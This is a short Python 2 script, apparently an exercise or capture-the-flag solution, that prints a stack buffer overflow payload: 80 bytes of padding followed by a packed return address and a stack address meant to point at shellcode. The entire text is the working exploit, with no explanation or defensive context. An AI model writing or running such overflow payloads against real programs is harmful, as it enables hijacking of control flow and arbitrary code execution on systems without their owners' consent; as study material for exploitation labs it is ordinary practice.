import struct

ret = struct.pack('I', 0x804853e)
addr_sc = struct.pack('I', 0xbffff897)

print 'A' * 80 + ret + addr_sc
